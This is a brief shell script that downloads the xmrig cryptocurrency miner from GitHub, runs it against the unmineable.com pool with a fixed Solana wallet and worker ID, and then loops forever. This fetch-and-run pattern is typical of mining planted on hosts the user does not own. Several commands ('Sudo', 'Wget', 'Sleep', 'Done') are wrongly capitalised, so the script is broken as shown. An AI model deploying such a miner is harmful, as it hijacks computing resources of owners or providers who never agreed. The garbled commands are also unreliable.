#!/bin/sh
Sudo apt update
Sudo apt install screen -y
Wget Https://GitHub.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x86.tar.gz
tar xf xmrig-6.14.0-linux-x86.tar.gz
cd xmrig-6.14.0
./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:DfrynH4wiHCBjZU6p8kkryPcfiycvN8MeyNHQ1Zv4B3S.unmineable_worker_ninwkhsw -p x  --cpu 2
while [  1  ]; do
Sleep 3
Done
Sleep 999
